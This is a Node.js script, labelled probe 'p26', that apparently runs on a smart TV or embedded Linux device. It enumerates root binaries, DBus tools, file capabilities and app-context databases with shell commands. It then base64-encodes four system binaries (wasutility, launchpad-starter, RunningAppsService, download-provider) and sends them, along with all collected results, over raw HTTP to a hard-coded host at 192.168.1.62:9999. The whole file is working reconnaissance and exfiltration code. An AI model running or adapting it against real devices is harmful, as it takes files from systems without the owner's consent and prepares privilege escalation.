"use strict";
/* p26: exfil root binaries + explore wasutility/RunningAppsService/launchpad/download-provider + DBus tools */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p26', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function exfilBin(b64path, label){
  try {
    var b = fs.readFileSync(b64path);
    var b64 = b.toString('base64');
    postRaw(label, b64);
    return 'posted '+b64.length+' b64';
  } catch(e){ return 'err '+e; }
}

R.results.dbspace = run('ls -ld /opt/dbspace 2>&1; echo ---; ls -la /opt/dbspace/.app-context.db /opt/dbspace/.app-context.db-journal 2>&1', 10000);
R.results.tvctx = run('ls -la /etc/tvctx-manager/ 2>&1; echo ---; mount 2>/dev/null | grep -iE "tvctx|etc" | head -5', 15000);

// DBus tools available?
R.results.dbus_tools = run('which dbus-send gdbus busctl dbus-daemon 2>&1; echo ---; ls /usr/bin/dbus-send /usr/bin/gdbus /usr/bin/busctl 2>&1', 10000);

// wasutility behavior
R.results.wasutility_noarg = run('wasutility 2>&1 | head -30', 15000);
R.results.wasutility_h = run('wasutility -h 2>&1 | head -20; echo ---HELP---; wasutility help 2>&1 | head -20', 15000);
R.results.wasutility_strings = run('(cat /usr/bin/wasutility) | grep -aE "usage|Usage|copy|save|install|launch|list|app|db|init|reset|restore" 2>/dev/null | head -40', 20000);

// launchpad-starter
R.results.lps_strings = run('(cat /usr/bin/launchpad-starter) | grep -aE "usage|Usage|launch|app|path|root|setuid|setgid|\.so|error|fail" 2>/dev/null | head -40', 20000);

// download-provider
R.results.dlprov_strings = run('(cat /usr/bin/download-provider) | grep -aE "usage|Usage|download|save|path|dest|url|dbus|service|interface|error|fail|privilege" 2>/dev/null | head -50', 20000);
R.results.dlprov_info = run('ls -la /usr/bin/download-provider 2>&1; echo ---; getcap /usr/bin/download-provider 2>/dev/null', 10000);

// RunningAppsService
R.results.ras_strings = run('(cat /usr/bin/RunningAppsService) | grep -aE "usage|Usage|dbus|service|interface|method|app|list|kill|stop" 2>/dev/null | head -40', 20000);

// exfil binaries
R.results.exfil_wasutility = exfilBin('/usr/bin/wasutility','bin_wasutility');
R.results.exfil_launchpad = exfilBin('/usr/bin/launchpad-starter','bin_launchpad-starter');
R.results.exfil_runningapps = exfilBin('/usr/bin/RunningAppsService','bin_RunningAppsService');
R.results.exfil_dlprov = exfilBin('/usr/bin/download-provider','bin_download-provider');

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p26info', JSON.stringify(R));
L('p26 done');
